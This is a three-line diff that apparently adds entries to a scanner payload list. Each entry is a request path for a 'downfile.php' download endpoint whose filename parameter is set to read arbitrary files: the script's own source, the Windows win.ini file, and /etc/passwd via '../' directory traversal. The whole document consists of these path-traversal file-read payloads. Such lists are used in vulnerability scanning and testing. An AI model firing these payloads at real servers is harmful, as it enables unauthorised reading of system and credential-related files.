@@ -1,0 +1,3 @@
+/htmltopdf/downfile.php?filename=downfile.php
+/htmltopdf/downfile.php?filename=/windows/win.ini
+/downFile.php?filename=../../../../etc/passwd
